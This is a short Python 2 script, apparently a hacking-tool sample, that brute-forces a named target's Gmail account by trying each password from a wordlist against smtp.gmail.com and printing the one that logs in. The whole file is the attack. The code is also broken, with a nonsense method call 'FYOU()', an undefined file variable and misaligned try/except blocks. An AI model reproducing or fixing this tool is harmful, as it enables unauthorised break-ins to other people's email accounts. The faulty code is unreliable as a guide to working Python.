#!/usr/bin/python
 
import smtplib
 
smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.FYOU()
smtpserver.starttls()
 
user = raw_input("Enter the target's email address: ")
passwordfile = raw_input("Enter the passord filename: ")
passwfile = open(passwfile, "r")
 
for password in passwfile:
        try:
                smtpserver.login(user,password)
                
                print "[+] Password Found: %s" % password
                break;
            except smtplib.SMTPAuthenticationError:
                print "[!] Password Incorrect: %s" % password